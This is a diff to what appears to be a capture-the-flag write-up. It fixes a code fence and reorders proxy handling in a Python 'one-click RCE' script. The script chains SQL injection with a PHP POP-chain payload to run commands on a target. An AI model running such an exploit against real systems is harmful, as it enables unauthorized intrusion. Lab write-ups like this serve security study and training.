@@ -292,7 +292,7 @@ cat /root/root.txt
 I've decided to write a script to combine both SQL Injection and RCE to make it into a one-click RCE script
 
 ```python
-```from bs4 import BeautifulSoup
+from bs4 import BeautifulSoup
 from hashlib import md5
 import requests
 import base64
@@ -397,14 +397,13 @@ def rceExploit(username, password, installDate, command, targetUrl, proxy):
 	print("[+] Generating POP chain payload")
 	payload = getRcePayload(php_function, command)
 	print("[+] Starting mechanize browser")
-	if proxy is not None:
-		print("[+] Proxy set to {proxy}".format(proxy=proxy))
 	br = mechanize.Browser()
-	br.set_proxies(None)
 	proxies = {
 		"http": proxy
 	}
-	br.set_proxies(proxies)
+	if proxy is not None:
+		print("[+] Proxy set to {proxy}".format(proxy=proxy))
+		br.set_proxies(proxies)
 	br.set_handle_robots(False)
 	request = br.open(targetUrl)
 	br.select_form(nr=0)                                                                
@@ -452,3 +451,4 @@ if __name__ == '__main__':
 	else:
 		proxy = args.debug
 	finalExploit(args.username, args.password, args.command, args.url, proxy)
+```
